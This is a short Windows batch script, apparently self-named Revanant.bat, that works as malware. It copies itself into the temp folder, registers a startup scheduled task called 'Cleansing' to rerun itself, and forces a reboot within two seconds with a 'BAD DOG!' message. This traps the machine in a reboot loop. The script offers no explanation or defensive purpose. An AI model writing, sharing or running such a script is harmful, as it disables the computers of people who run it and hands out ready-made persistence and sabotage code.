@echo off

copy "Revanant.bat" "%TEMP%"



schtasks /create /sc ONSTART /tn Cleansing /tr %TEMP%/Revanant.bat

shutdown /r /t 2 /c "BAD DOG!"